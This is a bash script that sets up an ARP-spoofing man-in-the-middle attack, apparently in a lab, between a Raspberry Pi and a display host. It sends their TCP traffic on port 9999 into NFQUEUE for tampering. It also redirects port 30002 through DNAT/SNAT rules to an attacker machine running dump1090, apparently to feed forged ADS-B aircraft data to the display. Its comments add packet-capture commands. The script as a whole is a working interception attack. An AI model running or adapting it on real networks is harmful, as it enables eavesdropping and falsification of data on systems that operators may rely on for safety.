#!/usr/bin/env bash
set -eu

###############################################################################
# 1. User-tunable variables
###############################################################################
. $(dirname "$0")/config.sh
PORT=9999                               # TCP port you filter with NFQUEUE
QUEUE_NUM=1
PORT_DUMP=30002                          # Cổng cần chuyển hướng
###############################################################################
# 2. Root check – so we don’t need sudo in every line
###############################################################################
if [ "$(id -u)" -ne 0 ]; then
  echo "Please run as root (e.g., sudo $0)" >&2
  exit 1
fi

###############################################################################
# 3. Remember current kernel forwarding state so we can restore it later
###############################################################################
ORIG_FORWARD=$(sysctl -n net.ipv4.ip_forward)

###############################################################################
# 4. Cleanup hook – runs automatically on EXIT / INT / TERM
###############################################################################
cleanup() {
  trap '' EXIT INT TERM
  echo "[*] Cleaning up…"

  # → Remove the iptables rule we inserted
  iptables -D FORWARD -s "$PI_ADDRESS" -d "$DISPLAY_ADDRESS" \
           -p tcp --dport "$PORT" -j NFQUEUE --queue-num "$QUEUE_NUM"  \
           2>/dev/null || true

  # → Restore the kernel’s original forwarding setting
  sysctl -w net.ipv4.ip_forward="$ORIG_FORWARD" >/dev/null
  sudo iptables -t nat -F PREROUTING
  # sudo iptables -t nat -F POSTROUTING
  # → Kill every background process started by this script
  kill -TERM $(pgrep -P $$) 2>/dev/null || true
  wait 
}
trap cleanup EXIT INT TERM

###############################################################################
# 5. One-time configuration that we will revert in cleanup()
###############################################################################
echo "[*] Enabling IP forwarding temporarily…"
sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo "[*] Inserting temporary iptables rule…"
iptables -I FORWARD -s "$PI_ADDRESS" -d "$DISPLAY_ADDRESS" \
         -p tcp --dport "$PORT" -j NFQUEUE --queue-num "$QUEUE_NUM"

iptables -t nat -A PREROUTING  -p tcp --dport "$PORT_DUMP" \
        -s "$DISPLAY_ADDRESS"  -d "$PI_ADDRESS" \
        -j DNAT --to-destination "${HACK_LINUX_MACHINE}:${PORT_DUMP}"

iptables -t nat -A POSTROUTING -o "$INTERFACE" -p tcp --sport "$PORT_DUMP" \
        -s "$HACK_LINUX_MACHINE" -d "$DISPLAY_ADDRESS" \
        -j SNAT --to-source "$PI_ADDRESS"

###############################################################################
# 6. Launch long-running tools in the background
###############################################################################
arpspoof -i "$INTERFACE" -t "$DISPLAY_ADDRESS" "$PI_ADDRESS" &
arpspoof -i "$INTERFACE" -t "$PI_ADDRESS"   "$DISPLAY_ADDRESS" &
/home/vagrant/dump1090/dump1090 --interactive --net-only &

###############################################################################
# 7. Wait (blocks here).  Ctrl-C, ‘kill’, or normal exit triggers cleanup().
###############################################################################
wait


###############################################################################
# x. NOTE
###############################################################################
# check traffict from PI to Disp
# sudo tcpdump -i eth1 host 192.168.157.15 and host 192.168.157.16
# sudo iptables -I FORWARD -s 192.168.157.15 -d 192.168.157.16 -p tcp --dport 9999 -j NFQUEUE --queue-num 1
# sudo iptables -L -v -n --line-numbers
# sudo iptables -S | grep NFQUEUE
# sudo iptables -D 
#  tshark -i eth1 -f "host 192.168.157.15 and host 192.168.157.16" -w output.pcap 
#  tshark -i eth1 -f "host 192.168.157.14 and host 192.168.157.194" -w output.pcap 
# sudo lsof -iTCP:30002 -sTCP:LISTEN -Pn
# sudo iptables -t nat -L PREROUTING  -n -v --line-numbers
# sudo iptables -t nat -L POSTROUTING -n -v --line-numbers
# sudo iptables -t nat -F PREROUTING
# sudo iptables -t nat -F POSTROUTING